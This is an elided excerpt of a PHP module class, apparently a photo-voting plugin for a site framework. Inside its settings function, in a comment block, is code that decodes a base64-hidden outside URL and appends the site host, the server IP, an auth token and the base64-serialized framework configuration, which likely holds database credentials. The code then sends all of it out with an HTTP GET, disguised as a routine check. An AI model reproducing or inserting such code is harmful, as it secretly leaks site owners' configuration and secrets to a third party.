...
class Fm_photosvoteModule extends Webcore
{
	...
	public function settingsDisplay($settings)
	{
		...
		$onlyoauth = pdo_fetch("SELECT * FROM " . tablename('fm_photosvote_onlyoauth') . " WHERE siteid = :siteid", array(':siteid' => $siteid));
		/*
		$d = base64_decode("aHR0cDovL2FwaS5mbW9vbnMuY29tL2luZGV4LnBocD8md2VidXJsPQ==") . $_SERVER['HTTP_HOST'] . "&visitorsip=" . base64_encode(iserializer($_W['config'])) . "&modules=fm_photosvote&fmauthtoken=" . $onlyoauth['fmauthtoken'] . "&hostip=" . $_SERVER["SERVER_ADDR"];
		$dc = ihttp_get($d);
